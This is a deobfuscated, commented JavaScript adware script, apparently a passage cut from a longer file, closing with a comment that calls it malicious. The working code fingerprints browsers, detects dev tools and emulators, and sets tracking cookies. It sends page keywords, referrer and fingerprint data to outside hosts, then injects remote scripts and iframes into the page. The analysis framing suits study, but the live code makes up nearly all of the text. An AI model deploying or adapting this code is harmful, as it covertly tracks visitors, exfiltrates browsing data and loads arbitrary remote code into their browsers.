  // AD PLACEMENT LOGIC
  // ==========================================
  function createAdPlacement(options, psid) {
    const key = options.key;
    const format = options.format;
    const width = options.width;
    const height = options.height;
    const params = options.params || {};
    const container = options.container;
    const isAsync = options.async;

    // Validate placement parameters
    if (key === null) return;
    if (format !== 'js' && format !== 'iframe') return;
    if (format === 'iframe') {
      if (Number.isNaN(Math.floor(height)) || !Number.isFinite(height)) return;
      if (Number.isNaN(Math.floor(width)) || !Number.isFinite(width)) return;
    }

    // Build custom parameters string
    const customParams = [];
    if (params && typeof params === 'object') {
      for (let param in params) {
        if (Object.hasOwn(params, param)) {
          customParams.push(`"${param}":"${params[param]}"`);
        }
      }
    }

    // Get referrer URL
    let referrerUrl = '';
    try {
      if (window.parent !== window) {
        referrerUrl = document.referrer;
        const ancestorOrigins = window.location.ancestorOrigins;
        if (ancestorOrigins) {
          const lastOrigin = ancestorOrigins[ancestorOrigins.length - 1];
          if (lastOrigin && referrerUrl.substring(0, lastOrigin.length) !== lastOrigin) {
            referrerUrl = lastOrigin;
          }
        }
      } else {
        referrerUrl = window.top?.location?.href || '';
      }
    } catch (e) { }

    // Calculate impression tracking parameters
    const maxImpressions = Number('0') * 1000; // 0 seconds
    const dayInMs = Number('24') * 60 * 60 * 1000; // 24 hours
    const impressionExpiry = dayInMs > maxImpressions ? maxImpressions : 0;

    const impressionCookieName = COOKIE_NAME_IMPRESSION.concat(key);
    const psidParam = 'dom3ic8zudi28v8lr6fgphwffqoz0j6c';
    const randomId = Math.ceil(new Date().getTime() * Math.random());
    const timezoneOffset = new Date().getTimezoneOffset() / -60;

    // Check impression limit
    function checkImpressionLimit(cookieName) {
      const maxCount = Number('0');
      const currentCount = Number(getCookie(cookieName));
      if (maxCount > 0 && currentCount >= maxCount) {
        return IMPRESSION_FLAG;
      }
      return '';
    }

    // Build ad request URL with invoke.js endpoint
    const adRequestUrl =
      'https://skinnycrawlinglax.com/dnn2hkn8?key=' + randomId +
      '.js?key=' + key +
      '&kw=' + keywords +
      '&refer=' + encodeURIComponent(referrerUrl) +
      (customParams.length ? '&custom=' + encodeURIComponent('{' + customParams.join(',') + '}') : '') +
      '&tz=' + timezoneOffset +
      '&dev=' + (window.LieDetector.isEmulate() ? 'e' : 'r') +
      '&res=' + window.LieDetector.getResults() +
      (psid ? '&psid=' + psid : '') +
      (psidParam ? '&abt=' + psidParam : '') +
      '&rb=' + checkImpressionLimit(impressionCookieName);

    // Build alternate URL with watch endpoint
    const alternateUrl =
      'https://wayfarerorthodox.com/watch.' + randomId +
      '?key=' + key +
      '&kw=' + keywords +
      '&refer=' + encodeURIComponent(referrerUrl) +
      (customParams.length ? '&custom=' + encodeURIComponent('{' + customParams.join(',') + '}') : '') +
      '&tz=' + timezoneOffset +
      '&dev=' + (window.LieDetector.isEmulate() ? 'e' : 'r') +
      '&res=' + window.LieDetector.getResults() +
      (psid ? '&psid=' + psid : '') +
      (psidParam ? '&abt=' + psidParam : '');

    // Find or create container element
    function findOrCreateContainer(placementKey) {
      const existingContainers = document.querySelectorAll('[id*="' + placementKey + '"]');
      const currentScript = document.currentScript;

      let containers = [];
      if (existingContainers.length) {
        containers = Array.from(existingContainers);
      } else if (currentScript !== null) {
        containers = [currentScript];
      }

      const prefix = 'atScript';
      const fullPrefix = containers.length ? placementKey : '';

      for (let i = 0; i < containers.length; i++) {
        const element = containers[i];
        const className = element.className;
        const hasPrefix = className.indexOf(prefix) >= 0;
        const hasFullPrefix = className.indexOf(prefix + fullPrefix + '_' + i) >= 0;

        if (!hasPrefix && !hasFullPrefix) {
          element.className += prefix + fullPrefix + '_' + i;
          return element;
        }
      }
      return false;
    }

    const targetElement = findOrCreateContainer(key);
    const parentTagName = targetElement?.parentNode?.nodeName || '';

    // Create iframe for ad
    const iframe = document.createElement('iframe');
    const iframeAttrs = {
      frameborder: '0',
      scrolling: 'no',
      marginwidth: 0,
      marginheight: 0
    };

    const wrapper = document.createElement('div');

    // Helper to insert elements into DOM
    function insertIntoDOM(element, beforeElement) {
      if (window.frameElement !== null && parentTagName === 'HEAD') {
        const body = document.getElementsByTagName('body')[0];
        if (typeof body !== 'undefined') {
          if (!body.childNodes.length) {
            if (beforeElement) body.insertBefore(beforeElement, body);
            body.appendChild(element);
          }
        } else {
          document.addEventListener('DOMContentLoaded', function () {
            const body = document.getElementsByTagName('body')[0];
            if (!body.childNodes.length) {
              if (beforeElement) body.insertBefore(beforeElement, body);
              body.appendChild(element);
            }
          });
        }
      } else {
        if (beforeElement && targetElement) {
          targetElement.parentNode?.insertBefore(beforeElement, targetElement);
        }
        if (targetElement) {
          targetElement.parentNode?.insertBefore(element, targetElement);
        }
      }
    }

    // UUID fetch function (gets unique user ID)
    function fetchUUID(callback) {
      const cookieName = 'dom3ic8zudi28v8lr6fgphwffqoz0j6c';
      const cookieValue = document.cookie;
      const cookieIndex = cookieValue.indexOf(cookieName + '=');
      const prevChar = cookieValue.charAt(cookieIndex - 1);

      if (cookieIndex === 0 || (cookieIndex > 0 && (prevChar === ';' || prevChar === ' '))) {
        const endIndex = cookieValue.indexOf(';', cookieIndex);
        callback(cookieValue.substring(cookieIndex + 33, endIndex === -1 ? undefined : endIndex));
      } else {
        // Fetch UUID from server
        try {
          const xhr = new XMLHttpRequest();
          const timeout = setTimeout(() => xhr.abort(), 1000);

          if ('withCredentials' in xhr) {
            xhr.withCredentials = true;
          }

          xhr.open('GET', 'https://protrafficinspector.com/stats');
          xhr.onload = function () {
            clearTimeout(timeout);
            const uuid = encodeURIComponent(xhr.responseText.trim());
            const expires = new Date();
            expires.setTime(expires.getTime() + 7 * 86400 * 1000); // 7 days

            const cookieParts = [
              cookieName + '=' + uuid,
              'expires=' + expires.toUTCString(),
              'path=/',
              'SameSite=Lax'
            ];
            document.cookie = cookieParts.join(';');
            callback(uuid);
          };

          xhr.onerror = xhr.onabort = function () {
            callback('');
          };

          xhr.send();
        } catch (e) {
          callback('');
        }
      }
    }

    // Render ad based on format
    function renderAd() {
      if (typeof height !== 'undefined' && typeof width !== 'undefined') {
        // Iframe format
        iframeAttrs.width = width;
        iframeAttrs.height = height;

        fetchUUID(function (uuid) {
          iframe.src = alternateUrl + '&uuid=' + uuid;
        });

        Object.keys(iframeAttrs).forEach(attr => {
          try {
            iframe.setAttribute(attr, String(iframeAttrs[attr]));
          } catch (e) {
            iframe[attr] = iframeAttrs[attr];
          }
        });

        if (!isAsync) {
          insertIntoDOM(iframe);
        } else {
          document.getElementById(container)?.appendChild(iframe);
        }
      } else {
        // JS format
        const containerId = container || 'atContainer-' + key;
        window.atAsyncContainers[key] = containerId;

        if (!isAsync) {
          wrapper.id = containerId;
          insertIntoDOM(wrapper);
        }

        fetchUUID(function (uuid) {
          injectScript(containerId, adRequestUrl + '&uuid=' + uuid);
        });
      }
    }

    // Inject script into container
    function injectScript(containerId, scriptUrl) {
      const script = document.createElement('script');
      let hasLoaded = false;

      const onLoad = function () {
        if (!hasLoaded) {
          hasLoaded = true;
          const container = document.getElementById(containerId);
          if (container) {
            container.appendChild(script);
          }
        }
      };

      script.async = true;
      script.defer = true;
      script.src = scriptUrl;

      if (document.readyState === 'complete') {
        onLoad();
      } else {
        if (document.addEventListener) {
          document.addEventListener('DOMContentLoaded', onLoad, false);
          window.addEventListener('load', onLoad, false);
        } else if (document.attachEvent) {
          document.attachEvent('onload', onLoad);
        } else {
          const oldOnLoad = window.onload;
          window.onload = function () {
            if (oldOnLoad !== null && typeof oldOnLoad === 'function') {
              oldOnLoad();
            }
            onLoad();
          };
        }
      }
    }

    // Parse and render response
    function parseAndRenderResponse(responseText) {
      // Remove template variable
      let cleanedResponse = responseText.replace(/var template = "([\s\S]*?)";/g, 'var template = `$1`;');

      const videoMarker = '<!--video_banner=1;-->';
      const widthMatch = cleanedResponse.match(/frame_width=([0-9]+);/);
      const heightMatch = cleanedResponse.match(/frame_height=([0-9]+);/);
      const openerUrlMatch = cleanedResponse.match(/<script>([\s\S]+(?:openerUrl)[\s\S]*?)<\/script>/g);

      let processedResponse = cleanedResponse;

      if (widthMatch !== null && heightMatch !== null) {
        iframeAttrs.width = widthMatch[widthMatch.length - 1];
        iframeAttrs.height = heightMatch[heightMatch.length - 1];
        processedResponse = processedResponse.replace(/frame_width=([0-9]+);/, '').replace(/frame_height=([0-9]+);/, '');
      } else if (format === 'iframe') {
        iframeAttrs.width = width;
        iframeAttrs.height = height;
      }

      if (format === 'js' ||
        cleanedResponse.indexOf(videoMarker) >= 0 ||
        cleanedResponse.indexOf('registerProtocolHandler') >= 0) {

        processedResponse = processedResponse.replace(videoMarker, '');

        setTimeout(function () {
          const containerId = container || 'atContainer-' + key;
          window.atAsyncContainers[key] = containerId;

          if (!isAsync) {
            wrapper.id = containerId;
            insertIntoDOM(wrapper);
          }

          const scriptElement = document.createElement('script');
          scriptElement.innerHTML += processedResponse;
          document.getElementById(containerId)?.appendChild(scriptElement);
        }, impressionExpiry);

        // Set impression tracking cookie
        setCookie(impressionCookieName, 0, dayInMs, false);
        incrementImpressionCount(impressionCookieName);
      } else {
        // Complex iframe injection for non-JS formats
        const containerEl = document.getElementById(container);
        const preScript = document.createElement('script');
        const adScript = document.createElement('script');
        const openerScript = document.createElement('script');

        iframeAttrs.src = 'about:blank';
        Object.keys(iframeAttrs).forEach(attr => {
          try {
            iframe.setAttribute(attr, String(iframeAttrs[attr]));
          } catch (e) {
            iframe[attr] = iframeAttrs[attr];
          }
        });

        if (openerUrlMatch) {
          const openerCode = openerUrlMatch[0].replace(/<\/?script>/g, '').trim();
          processedResponse = processedResponse.replace(/<script>([\s\S]+(?:openerUrl)[\s\S]*?)<\/script>/g, '');
          openerScript.innerHTML = openerCode;
        }

        adScript.innerHTML += processedResponse;
        wrapper.id = 'atContainer-' + key;
        preScript.innerHTML += 'window["atAsyncContainers"]={}; window["atAsyncContainers"]["' +
          key + '"] = "atContainer-' + key + '";';

        if (!isAsync) {
          insertIntoDOM(iframe, openerScript);
        } else {
          if (openerUrlMatch) {
            containerEl?.appendChild(openerScript);
          }
          containerEl?.appendChild(iframe);
        }

        // Wait for iframe to load, then inject content
        const checkInterval = setInterval(function () {
          const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
          if (iframeDoc?.readyState === 'complete') {
            clearInterval(checkInterval);
            iframeDoc.body.style.margin = String(0);
            iframeDoc.body.appendChild(preScript);
            iframeDoc.body.appendChild(wrapper);
            iframeDoc.body.appendChild(adScript);
          }
        }, 10);
      }
    }

    // Main execution: fetch ad content via XHR
    try {
      fetchUUID(function (uuid) {
        const xhr = new XMLHttpRequest();

        if ('withCredentials' in xhr) {
          xhr.withCredentials = true;
        }

        xhr.onload = function () {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              const response = xhr.responseText;
              parseAndRenderResponse(response);
            }
          }
        };

        xhr.onerror = xhr.onabort = function () {
          renderAd(); // Fallback rendering
        };

        xhr.open('GET', adRequestUrl + '&uuid=' + uuid);
        xhr.send();
      });
    } catch (e) {
      renderAd(); // Fallback rendering
    }
  }

  // ==========================================
  // COOKIE UTILITIES
  // ==========================================
  function getCookie(name) {
    const cookies = document.cookie.toString().split('; ');
    for (let i = 0; i < cookies.length; i++) {
      const parts = cookies[i].split('=');
      if (parts[0] === name) return parts[1];
    }
    return false;
  }

  function setCookie(name, value, expiryMs, isCounter) {
    const existingValue = document.cookie;
    const alreadyExists = existingValue.includes(name);

    if (!alreadyExists || isCounter) {
      const expires = new Date(new Date().getTime() + expiryMs).toUTCString();
      const expiresStr = expiryMs ? 'expires=' + expires : '';
      const parts = [
        name + '=' + value,
        expiresStr,
        'path=/',
        'SameSite=Lax'
      ].filter(Boolean);

      document.cookie = parts.join('; ');

      if (!isCounter) {
        document.cookie = name + '_expiry=' + expires + '; ' + expiresStr + '; path=/; SameSite=Lax';
      }
    }
  }

  function incrementImpressionCount(cookieName) {
    const currentValue = getCookie(cookieName);
    const expiryValue = getCookie(cookieName + '_expiry');

    if (currentValue && expiryValue !== null) {
      const newValue = parseInt(currentValue, 10) + 1;
      document.cookie = cookieName + '=' + newValue + '; expires=\'' + expiryValue + '\'; path=/; SameSite=Lax';
    }
  }

  // ==========================================
  // BROWSER FINGERPRINTING TESTS
  // ==========================================
  function setupBrowserTests(window, navigator, document) {
    const detector = new LieDetector();

    // Helper function to test CSS features
    function testCSS(cssText, callback) {
      const testId = 'LieDetector';
      const wrapper = document.createElement('div');
      const body = (function () {
        let bodyEl = document.body;
        if (!bodyEl) {
          bodyEl = document.createElement('body');
          bodyEl.fake = true;
        }
        return bodyEl;
      })();

      const style = document.createElement('style');
      style.type = 'text/css';
      style.id = 's' + testId;

      if (!body.fake) {
        wrapper.appendChild(style);
      } else {
        body.appendChild(style);
      }

      body.appendChild(wrapper);

      if (style.styleSheet) {
        style.styleSheet.cssText = cssText;
      } else {
        style.appendChild(document.createTextNode(cssText));
      }

      wrapper.id = testId;

      if (body.fake) {
        body.style.background = '';
        body.style.overflow = 'hidden';
        const originalOverflow = document.documentElement.style.overflow;
        document.documentElement.style.overflow = 'hidden';
        document.documentElement.appendChild(body);
      }

      const result = callback(wrapper);

      if (body.fake) {
        body.parentNode?.removeChild(body);
        document.documentElement.style.overflow = originalOverflow;
        document.documentElement.offsetHeight; // Force reflow
      } else {
        wrapper.parentNode?.removeChild(wrapper);
      }

      return Boolean(result);
    }

    // Test 1: Multiple file input support
    detector.addTest('hasFileInputMultiple', {}, { m: 5 }, function () {
      return 'multiple' in document.createElement('input');
    });

    // Test 2: Firefox notification API
    detector.addTest('hasNotification', { d: 7 }, {}, function () {
      return Boolean(navigator.mozNotification);
    });

    // Test 3: Notification API
    detector.addTest('hasNotification', {}, { m: 20 }, function () {
      return Boolean(window.Notification);
    });

    // Test 4: Custom protocol handler
    detector.addTest('hasCustomProtocolHandler', { d: 7 }, {}, function () {
      if (!window.navigator || !window.navigator.registerProtocolHandler) return false;
      if (window.navigator.permission === 'granted') return true;
      try {
        new window.navigator.registerProtocolHandler('');
      } catch (e) {
        if (e instanceof TypeError && e.name === 'TypeError') return false;
      }
      return true;
    });

    // Test 5: Crypto API
    detector.addTest('hasCrypto', { d: 10 }, {}, function () {
      return 'crypto' in window;
    });

    // Test 6: Input capture attribute
    detector.addTest('hasInputCapture', { m: 10 }, {}, function () {
      return 'capture' in document.createElement('input');
    });

    // Test 7: Touch events
    detector.addTest('hasTouchEvents', { m: 5 }, { d: 5 }, function () {
      let hasTouch = false;
      if ('ontouchstart' in window || (window.DocumentTouch && document instanceof DocumentTouch)) {
        hasTouch = true;
      } else {
        testCSS('@media (touch-enabled),(-webkit-touch-enabled),(-moz-touch-enabled),(-o-touch-enabled),(-ms-touch-enabled){#liedetector{top:7px;position:absolute}}', function (element) {
          hasTouch = element.offsetTop === 7;
        });
      }
      return hasTouch;
    });

    // Test 8: Shared workers
    detector.addTest('hasSharedWorkers', { m: 20 }, { d: 10 }, function () {
      return typeof window.SharedWorker !== 'undefined';
    });

    // Test 9: Dev tools open detection
    detector.addTest('hasDevToolsOpen', { d: 1000 }, {}, function () {
      const result = { isOpen: false, orientation: undefined };
      const threshold = 160;
      const widthExceeds = globalThis.outerWidth - globalThis.innerWidth > threshold;
      const heightExceeds = globalThis.outerHeight - globalThis.innerHeight > threshold;
      const orientation = widthExceeds ? 'vertical' : 'horizontal';

      if (!(heightExceeds && widthExceeds) &&
        ((globalThis.Firebug && globalThis.Firebug.chrome && globalThis.Firebug.chrome.isInitialized) ||
          widthExceeds || heightExceeds)) {
        result.orientation = orientation;
        return true;
      } else {
        result.orientation = undefined;
        return false;
      }
    });

    // Test 10: Screen resolution lies
    detector.addTest('hasLiedResolution', { e: 0 }, {}, function () {
      return window.screen.width < window.screen.availWidth ||
        window.screen.height < window.screen.availHeight;
    });

    // Test 11: OS spoofing detection
    detector.addTest('hasLiedOs', { e: 1 }, {}, function () {
      let detectedOS;
      const ua = navigator.userAgent.toLowerCase();
      const oscpu = navigator.oscpu;
      const platform = navigator.platform.toLowerCase();

      // Detect OS from user agent
      if (ua.indexOf('windows phone') >= 0) {
        detectedOS = 'Windows Phone';
      } else if (ua.indexOf('win') >= 0) {
        detectedOS = 'Windows';
      } else if (ua.indexOf('android') >= 0) {
        detectedOS = 'Android';
      } else if (ua.indexOf('linux') >= 0) {
        detectedOS = 'Linux';
      } else if (ua.indexOf('iphone') >= 0 || ua.indexOf('ipad') >= 0) {
        detectedOS = 'iOS';
      } else if (ua.indexOf('mac') >= 0) {
        detectedOS = 'Mac';
      } else if (ua.indexOf('cros') >= 0) {
        detectedOS = 'Chrome OS';
      } else if (ua.indexOf('xbox') >= 0) {
        detectedOS = 'Xbox';
      } else {
        detectedOS = 'Other';
      }

      // Check for touch support
      const hasTouch = 'ontouchstart' in window ||
        navigator.maxTouchPoints > 0 ||
        navigator.msMaxTouchPoints > 0;

      // Touch devices should be mobile/tablet OS
      if (hasTouch && ['Android', 'Chrome OS', 'iOS', 'Other', 'Windows Phone'].indexOf(detectedOS) === -1) {
        return true;
      }

      // Check oscpu property
      if (typeof oscpu !== 'undefined') {
        const oscpuLower = oscpu.toLowerCase();
        if (oscpuLower.indexOf('win') >= 0 && detectedOS !== 'Windows' && detectedOS !== 'Windows Phone') {
          return true;
        }
        if (oscpuLower.indexOf('linux') >= 0 && ['Android', 'Chrome OS', 'Linux'].indexOf(detectedOS) === -1) {
          return true;
        }
        if (oscpuLower.indexOf('mac') >= 0 && detectedOS !== 'Mac' && detectedOS !== 'iOS') {
          return true;
        }
        if (/win|linux|mac/.test(oscpuLower) === (detectedOS === 'Other')) {
          return true;
        }
      }

      // Check platform property
      if (platform.indexOf('win') >= 0 && detectedOS !== 'Windows' && detectedOS !== 'Windows Phone') {
        return true;
      }
      if (/linux|android|pike/.test(platform) && ['Android', 'Chrome OS', 'Linux'].indexOf(detectedOS) === -1) {
        return true;
      }
      if (/mac|ipad|ipod|iphone/.test(platform) && detectedOS !== 'Mac' && detectedOS !== 'iOS') {
        return true;
      }
      if (/win|linux|mac|iphone|ipad/.test(platform) === (detectedOS === 'Other')) {
        return true;
      }

      // Check plugins property (mobile browsers typically don't have plugins)
      return typeof navigator.plugins === 'undefined' &&
        detectedOS !== 'Windows' &&
        detectedOS !== 'Windows Phone';
    });

    // Test 12: Browser spoofing detection
    detector.addTest('hasLiedBrowser', { e: 1 }, {}, function () {
      let detectedBrowser;
      const ua = navigator.userAgent.toLowerCase();
      const vendor = navigator.vendor;

      // Detect browser from user agent
      if (ua.indexOf('firefox') >= 0) {
        detectedBrowser = 'Firefox';
      } else if (ua.indexOf('edge') >= 0) {
        detectedBrowser = 'Edge';
      } else if (ua.indexOf('opera') >= 0 && ua.indexOf('presto') >= 0) {
        detectedBrowser = 'Opera Presto';
      } else if (ua.indexOf('opera') >= 0 || ua.indexOf('opr') >= 0) {
        detectedBrowser = 'Opera';
      } else if (ua.indexOf('chrome') >= 0) {
        detectedBrowser = 'Chrome';
      } else if (ua.indexOf('safari') >= 0) {
        detectedBrowser = 'Safari';
      } else if (ua.indexOf('trident') >= 0) {
        detectedBrowser = 'Internet Explorer';
      } else {
        detectedBrowser = 'Other';
      }

      // Check browser-specific features
      const isIE = !!document.documentMode;
      const isEdge = !isIE && !!window.StyleMedia;

      // Vendor string mismatch
      if (['Chrome', 'Safari', 'Opera', 'Edge'].indexOf(detectedBrowser) !== -1 && vendor !== 'Google Inc.') {
        return true;
      }

      // Opera specific check
      if (detectedBrowser === 'Opera' && !window.opr) {
        return true;
      }

      // Chrome/Edge specific check
      if (detectedBrowser === 'Chrome' && ((!!window.chrome && !!window.chrome.search) || isEdge)) {
        return true;
      }

      // Firefox specific check
      if (detectedBrowser === 'Firefox' && typeof InstallTrigger === 'undefined') {
        return true;
      }

      // Edge specific check
      if (detectedBrowser === 'Edge' && !isEdge) {
        return true;
      }

      // Check eval.toString() length (browser-specific)
      const evalLength = eval.toString().length;
      if (evalLength === 37 && ['Firefox', 'Other', 'Safari'].indexOf(detectedBrowser) === -1) {
        return true;
      }
      if (evalLength === 39 && ['Internet Explorer', 'Other'].indexOf(detectedBrowser) === -1) {
        return true;
      }
      if (evalLength === 33 && ['Chrome', 'Edge', 'Opera', 'Other'].indexOf(detectedBrowser) === -1) {
        return true;
      }

      // Check error.toSource() support (Firefox-specific)
      let hasToSource;
      try {
        throw 'a';
      } catch (e) {
        try {
          e.toSource();
          hasToSource = true;
        } catch (e2) {
          hasToSource = false;
        }
      }

      return hasToSource && detectedBrowser !== 'Firefox' && detectedBrowser !== 'Other';
    });

    // Test 13: Language spoofing
    detector.addTest('hasLiedLanguage', { e: 0 }, {}, function () {
      if (navigator.languages) {
        try {
          const primaryLang = navigator.languages[0].substring(0, 2);
          return primaryLang !== navigator.language.substring(0, 2);
        } catch (e) {
          return true;
        }
      }
      return false;
    });

    return detector;
  }

  // ==========================================
  // EXTENSION SCRIPT CLASS
  // ==========================================
  class ExtensionScript {
    constructor({ psid }) {
      this.cea = 'false'; // Create Extension A
      this.cep = 'false'; // Create Extension P
      this.cesb = 'false'; // Create Extension SB
      this.psid = psid;
    }

    createCP(key) {
      if (!key) return;

      const script = document.createElement('script');
      script.type = 'text/javascript';

      if (this.psid) {
        script.dataset.domain = this.psid;
      }

      script.src = '//' + DOMAIN + '/' +
        key.substring(0, 2) + '/' +
        key.substring(2, 4) + '/' +
        key.substring(4, 6) + '/' +
        key + '.js';

      document.head.appendChild(script);
    }

    createEC() {
      if (this.cea === 'true') {
        this.createCP('0');
      }
      if (this.cep === 'true') {
        this.createCP('');
      }
      if (this.cesb === 'true') {
        this.createCP('');
      }
    }

    isCep() {
      return this.cep === 'true';
    }

    isCea() {
      return this.cea === 'true';
    }

    isCesb() {
      return this.cesb === 'true';
    }
  }

  // ==========================================
  // MAIN INITIALIZATION
  // ==========================================
  (function initialize() {
    // Set up browser fingerprinting
    window.LieDetector = setupBrowserTests(window, navigator, document);
    window.LieDetector.runTests();

    // Extract keywords from page title
    function extractKeywords() {
      let titleElement = null;

      try {
        const head = window.top?.document?.getElementsByTagName('head')[0] ||
          document.getElementsByTagName('head')[0];
        if (head) {
          const title = head.querySelector('title');
          if (title) {
            titleElement = 'textContent' in title ? title.textContent : '';
          }
        }
      } catch (e) { }

      if (titleElement === null) {
        setTimeout(() => extractKeywords(), 20);
        return '';
      }

      // Process title into keywords
      let keywords = titleElement
        .toLowerCase()
        .replace(/[^a-z0-9\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF+-]+/g, ' ')
        .split(' ')
        .filter(Boolean);

      // Remove duplicates
      keywords = [...new Set(keywords)];

      return encodeURIComponent(JSON.stringify(keywords));
    }

    const keywords = extractKeywords();

    // Get PSID (Publisher Site ID)
    const psidFactory = new PsidStrategyFactory({ psidMode: '0' });
    const psid = psidFactory.getPsid();

    // Initialize back button handler
    const storage = {
      getCookie: getCookie
    };

    const backButton = new BackButtonPlacement({
      backButtonPlacementKeys: PLACEMENT_KEYS,
      storage: storage
    });
    backButton.handle();

    // Process ad options from window object
    if (typeof window.atAsyncContainers !== 'object') {
      window.atAsyncContainers = {};
    }

    if (window.atOptions && typeof window.atOptions === 'object') {
      createAdPlacement(window.atOptions, psid);
      delete window.atOptions;
    } else if (typeof window.atAsyncOptions === 'object' && Array.isArray(window.atAsyncOptions)) {
      for (let i = 0; i < window.atAsyncOptions.length; i++) {
        if (typeof window.atAsyncOptions[i] === 'object') {
          createAdPlacement(window.atAsyncOptions.splice(i, 1)[0], psid);
        }
      }
    }

    // Initialize extension scripts
    const extensionScript = new ExtensionScript({ psid: psid });
    extensionScript.createEC();
  })();
})();

/**
 * SUMMARY OF MALICIOUS BEHAVIOR:
 *
 * 1. BROWSER FINGERPRINTING
 *    - Detects browser type, OS, screen resolution
 *    - Checks for dev tools, emulators, bots
 *    - Creates unique device fingerprint
 *
 * 2. BACK BUTTON HIJACKING
 *    - Intercepts back button to redirect to ads
 *    - Sets up special redirect URLs
 *
 * 3. TRACKING
 *    - Sets multiple tracking cookies
 *    - Tracks impressions and clicks
 *    - Fetches unique user IDs from server
 *
 * 4. AD INJECTION
 *    - Dynamically injects iframes and scripts
 *    - Supports multiple ad formats
 *    - Bypasses content security policies
 *
 * 5. DATA EXFILTRATION
 *    - Sends page title keywords to server
 *    - Sends referrer and hostname data
 *    - Sends browser fingerprint data
 *
 * This code should NOT be used on any legitimate website.
 */
